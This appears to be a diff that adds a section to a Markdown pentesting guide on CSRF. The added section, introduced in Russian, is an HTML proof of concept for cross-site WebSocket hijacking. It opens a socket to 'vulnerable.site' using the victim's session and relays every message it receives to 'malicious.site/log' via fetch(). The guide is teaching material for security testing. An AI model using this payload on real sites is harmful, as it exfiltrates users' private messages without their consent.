@@ -155,6 +155,42 @@ Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execut
  Cookie: session_id=victim_uuid	
 ```
 
+Или отправка через Fetch API, а не через jquery:
+
+```markup
+<html>
+    <head>test</head>
+    <body>
+        <script>
+
+            function send(message) {
+                let params = {
+                    message
+                };
+
+                let sp = new URLSearchParams(params);
+
+                fetch("https://malicious.site/log?" + sp.toString(), {method: 'GET'})
+                    .then(response => response.text())
+                    .then(text => console.log(text));
+            }
+            
+
+            let socket = new WebSocket("wss://vulnerable.site/chat");
+            
+            socket.onopen = function(e) {
+                // Connected
+                socket.send("READY");
+            };
+
+            socket.onmessage = function(event) {
+                send(event.data);
+            };
+        </script>
+    </body>
+</html>
+```
+
 ## CSRF Testing MindMap
 
 ![CSRF Testing MindMap](../../.gitbook/assets/image.png)
